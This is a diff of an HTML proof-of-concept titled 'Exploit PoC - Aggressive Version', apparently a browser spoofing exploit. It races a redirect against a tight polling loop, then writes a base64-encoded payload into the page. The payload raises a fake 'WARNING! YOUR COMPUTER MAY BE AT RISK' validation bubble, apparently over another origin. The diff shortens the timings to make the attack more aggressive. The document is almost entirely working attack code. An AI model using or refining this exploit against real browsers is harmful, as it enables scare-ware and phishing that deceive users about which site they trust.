@@ -1,36 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Exploit PoC - Aggressive Version</title>
+<style>
+  #panel {
+    display: none;
+    position: fixed;
+    top: 20%;
+    left: 30%;
+    padding: 20px;
+    background: #fff;
+    border: 2px solid #000;
+    z-index: 9999;
+  }
+</style>
+</head>
+
 <body>
-<button onclick="foo()">go</button>
-</body>
+
+<button onclick="foo()">GO</button>
+
+<div id="panel">
+  <p>Trusted UI Panel</p>
+</div>
 
 <script>
 var w;
 var t;
 
 function foo(){
+    // Triggering the redirect and race
+    w = setTimeout(() => {
+        document.location = "http://www.google.com";  // Faster redirect after 1 second
+    }, 1000);
 
-    // Redirect setelah 10 detik
-    w = setTimeout(function(){
-        document.location = "https://www.google.com:90";
-    }, 10000);
-
-    // Cek window tiap 100ms (lebih ringan)
-    t = setInterval(bar, 100);
+    // Aggressive interval check at 10ms for faster response
+    t = setInterval(bar, 10);
 }
 
-function bar(){
-    try{
-        w.location.href;
-    }
-    catch(e){
-        clearInterval(t);
-
-        // Payload dijalankan setelah 5 detik
-        setTimeout(function(){
-            document.write(atob(
-                'PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSyIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDE1MDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='
-            ));
+function bar() {
+    try {
+        w.location.href;  // Checking location change
+    } catch (e) {
+        clearInterval(t); // Stop checking once redirect is successful
+        // Injecting the payload as soon as the redirect is blocked
+        setTimeout(() => {
+            document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSyIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));
             test();
-        }, 5000);
+        }, 500);  // Inject payload after 0.5 seconds
     }
 }
+
+window.addEventListener('pageshow', () => {
+    requestAnimationFrame(() => {
+        requestAnimationFrame(() => {
+            setTimeout(() => {
+                // Immediately redirect to an external address (super fast)
+                location.href = 'https://google.com:9090';  // Aggressive redirect
+            }, 100);  // 100ms delay for quicker timing
+        });
+    });
+});
 </script>
+
+</body>
+</html>
